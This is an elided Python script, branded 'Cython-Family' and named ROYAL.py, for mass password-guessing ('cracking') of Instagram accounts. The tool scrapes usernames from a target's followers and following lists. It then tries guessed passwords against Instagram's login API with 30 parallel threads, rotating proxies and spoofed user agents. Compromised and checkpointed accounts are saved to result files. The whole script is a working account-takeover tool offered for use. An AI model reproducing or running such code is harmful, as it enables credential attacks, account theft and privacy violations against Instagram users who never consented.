...
zx=[]
try:
	link = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all").text
...
for aing in range(10000):
	rr = random.randint
	rc = random.choice
	ua = f"Mozilla/5.0 (Linux; Android {str(rr(4,13))}; FINNEY U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36"
	baru.append(ua)
...
║ Telegram : https://t.me/Cython-Family    ║
║ Version  : 5.0                           ║
║ FILENAME : ROYAL                         ║
╚══════════════════════════════════════════╝""")
def loadinglisen():
...
def loadinglogin():
    ...
    for i in range(50):
        time.sleep(0)
        sys.stdout.write(f"\r{H}[{H}+{H}] {H}PROCESSING....{H} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
...
def Main_():
    if "sukses" in lisensiku:
        try:
            ...
            banner()
            cetak(nel('[bold green]LOGIN INSTAGRAM COOKIES [/]'))
            coki = input('[01] INPUT COOKIES : ')
            try:
                ...
                loadinglogin()
                prints(Panel(f"        ACTIVE [green]{nama}[/] COOKIES VERIFIED", padding=(0,5), style="bold white", width=70));time.sleep(0);time.sleep(0);exit(f"[{M}!{N}] INPUT THE TOOL AGAIN BY TYPING Python ROYAL.py")
                ...
                exit(f'{merah}BAD INTERNET CONNECTION')
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
...
def login():
	global external
	try:
		wel = '[#] LOGIN USING A NEW INSTAGRAM ACCT ONLY'
		wel2 = mark(wel, style='green')
		sol().print(wel2)
		us=input(f"{H}[+] LOGIN USERNAME {N}")
		pw=stdiomask.getpass(prompt=f'{N}[+] LOGIN PASSWORD  {N}')
	...
	if x.get('status')=='success':
		...
		wel = '[#] WRONG USERNAME AND PASSWORD '
		wel2 = mark(wel, style='red')
		sol().print(wel2)
		login()
def User_Agent():
...
║                       ║
╚═══════════════════════╝
[01] CLONE FROM FOLLOWERS
[02] CLONE FROM FOLLOWING
[03] CHECK CRACKED STATUS
[00] EXIT
	""")
			
	def Exit(self):
		linex()
		x=input(f'{H}[+] DO YOU WANT TO EXIT ? [Y/T]: ')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
					...
					for z in range (9999):
						...
						try:
							for i in x_jason['users']:
								...
								internal.append(f'{username}|{nama}')
								following.append(username)
							sys.stdout.write(f"\r{H}+{N} PROCESSING USERNAME {H}{len(internal)} {N}USERNAME FROM {H}{user}{N}")
							sys.stdout.flush()
							time.sleep(0)
							try:
								maxid=x_jason['next_max_id']
	...
	def ua_huai(self):
		rr = random.randint
		rc = random.choice
		ver=rc(["21/5.0.1","23/6.0"])
		pxl=rc(["720x1184","720x1208"])
		name =rc(["lv_LV","it_IT","fr_FR","de_DE","pt_CV","ru_KZ"])
		...
		igve=igv.split(",")
		versi=rc(igve)
		ua = f"Instagram {versi} Android ({ver}; 320dpi; {pxl}; HUAWEI/Huawei; ALE-L21; hwALE-H; hi6210sft; {name})"
		return ua
	...
	def ingfo(self):
		urut = []
		prints(Panel(f"[{bc}!{hapus}] RESULTS WILL BE SAVED", padding=(0,4),style=""))
	...
	def ifo(self):
		urut = []
		prints(Panel(f"[{bc}+{hapus}] CHOOSE METHOD ",style=""))
		urut.append(Panel(f"[01] METHOD [bold green]API[/]",padding=(0,1),style=""))
		urut.append(Panel(f"[02] METHOD [bold green]API V2[/]",padding=(0,1),style=""))
		urut.append(Panel(f"[03] METHOD [bold green]AJAX[/]",padding=(0,1),style=""))
		self.tol.print(Columns(urut))

	def passwordAPI(self,xnx):
		idtar=f'[+] TOTAL MAXIMUM ID  : [green]{len(internal)} [/green]'
		idtar1=nel(idtar,style='')
		sol().print(idtar1)
		self.ifo()
		u = input(f'[+] CHOOSE METHOD ')
		if u in ["1","01"]:
			method.append('satu')
		elif u in ["2","02"]:
			method.append('dua')
		...
		if c in ["01","1"]:
			...
			prints(Panel(f"{P2}METHOD PASSWORD : Cameron,Nigeria,Ghanaian",width=80,padding=(0,4),style=""))
			zx=input(f'{N}[+] ADD PASSWORD {N} ')
			zz = zx.split(",")
			for i in zz:
				self.pwa.append(i)
			...
			with ThreadPoolExecutor(max_workers=30) as shinkai:
				for i in user:
					try:
						...
						pass
			print('\n')
			prints(Panel(f"{P2}[{H2}✓{P2}] PROCESS COMPLETED",width=80,padding=(0,4),style=f"{color_table}"));time.sleep(0)
			exit()
	...
	def crackAPI(self,user,pas):
		...
		prog.update(des,description=f"[{acakrich}Cython-Family[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					...
					if "logged_in_user" in str(ncek) or "sessionid" in ses.cookies.get_dict() or "userId" in str(ncek):
						...
						prog.update(des,description=f"{M2}CASTING[/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(0)
		...
		try:
           ...
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			...
			"trustedDeviceRecords": {}}
				respon=ses.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", headers=head,data=data,proxies=proxs)
				...
				if "userId" in str(haris) or "sessionid" in ses.cookies.get_dict():
					...
					prog.update(des,description=f"{M2}CASTING[/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold red]{len(checkpoint)}[/]")
					prog.advance(des)
		...
		try:
           ...
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			...
			if 'userId' in str(ncek):
				...
				sys.stdout.write(f"\r{M} TURN ON AIRPLANE MODE ");sys.stdout.flush();sleep(0)
			else:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}Akun telah diganti password",width=80,padding=(0,4),style=""))
		except requests.ConnectionError:
			sys.stdout.write(f"\r{M} TURN ON AIRPLANE MODE EVERY 5 SEC ");sys.stdout.flush();sleep(0)
		except Exception as e:prints(e)
			#self.checkAPI(user,pw) 	 
	def cek_hasil(self):
		no,nom = 0,[]
		urut = []
		prints(Panel(f"\t[{bc}!{hapus}] CHECK CRACK RESULTS", padding=(0,4),style=""))
		urut.append(Panel(f"[1] Cek hasil akun {H2}success{hapus}",padding=(0,5),style=""))
		urut.append(Panel(f"[2] CHECK ACCOUNT RESULTS {K2}checkpoint{hapus}",padding=(0,5),style=""))
		self.tol.print(Columns(urut))
		one=input("YOUR CHOICE: ")
		if one in ['1','01']:
			try:ok = os.listdir('result/success/')
			except:prints(f" [{M2}!{hapus}] NO SUCCESS RESULTS FOUND");time.sleep(0);self.menu()
			for x in ok:
				nom.append(x)
				no+=1
			...
			abc = input(f'[{H}?{N}] FILE NAME : ')
			file = nom[int(abc)-1]
			try:buka = open('result/success/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] NO SUCCESS RESULTS FOUND");time.sleep(1);self.menu()
			print("")
			print( H+buka+N)
			input(f'\n[{H}!{N}] TYPE ENTER TO RETURN BACK');self.menu()
		elif one in ['2','02']:
			try:ok = os.listdir('result/checkpoint/')
			except:prints(f" [{M2}!{hapus}] NO SUCCESS RESULTS FOUND");self.menu()
			for x in ok:
				nom.append(x)
				no+=1
			...
			except:prints(f" [{M2}!{hapus}] NO CHECKPOINT RESULTS FOUND");time.sleep(1);self.menu()
			print("")
			print( K+buka+N)
			input(f'\n[{H}!{N}] TYPE ENTER TO RETURN BACK');self.menu()
		else:print(f" [{M}!{N}] CORRECT");time.sleep(2);self.menu()
	def menu(self):
		self.logo()
		c=input(f'{N}[+] CHOOSE {C}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			...
			sol().print(po)
			#massal(self)
			mas=input('  [+] DO YOU WANT RANDOM CLONE ? Y/T ')
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			...
			for i in os.listdir('result/checkpoint/'):
				print(f'[{P}+{P}] {i}')
			c=input(f'\n[{P}+{N}] INPUT NAME FILE {C}')
			g=open("result/checkpoint/%s"%(c)).read().splitlines()
			print(f'\n{H}[+] TOTAL RESULT FOUND {H}{len(g)}{C}')
			print(f'\n{H}┣[+] PROCESSING HOLD {C}\n')
			for s in g:
				user=s.split('|')[0]
				pwd=s.split('|')[1]
			...
			for i in following:
				...
				print(f' {str(six)}{U} {C} {i} {H}Unfollow-SUCCESS{C}')
...
def mengi(self):
			try:
				...
				mas='[+] ALL TARGET MUST BE PUBLIC '
				mas1=nel(mas,style='')
				sol().print(mas1)
				m=int(input(f'\n{N}[+] ENTER TOTAL TARGET {N}'))
			except:m=1
			for t in range(m):
				t +=1
				so=f'[+] TOTAL MAXIMUM ID :{len(internal)}'
				pi=mark(so,style='green')
				sol().print(pi)
				nama=input(f'[+] INPUT USERNAME ')
				pr=f"[+] TYPE {H2}CTRL + C {hapus} TO STOP DUMP USERNAME"
				u=nel(pr,style="")
				sol().print(u)
...
def masal(self):
			try:
				...
				mas1=nel(mas,style='')
				sol().print(mas1)
				m=int(input(f'\n{H}[+] INPUT TARGET AMOUNT {N}'))
			except:m=1
			for t in range(m):
				t +=1
				so=f'{hapus}[+] TOTAL MAXIMUM ID :{len(internal)}'
				pi=mark(so,style='green')
				sol().print(pi)
				nama=input(f'[+] INPUT USERNAME ')
				pr=f"[+] TYPE {H2}CTRL + C {hapus} TO STOP DUMP USERNAME"
...
def massal(self):
			...
			pr=f"[+] TYPE {M2}CTRL + C {hapus} TO STOP DUMP USERNAME"
			so=nel(pr,style="")
			sol().print(so)
...
if __name__=='__main__':
	...
	try:
		ko = ses.get('https://pastebin.com/raw/cKyh80Fj').json()
		HARIS1.update(ko)
		ki = ses.get('https://pastebin.com/raw/MRtGRXYM').json()
		HARIS.update(ki)
	except Exception as e:
		prints(e)
	login_kamu()
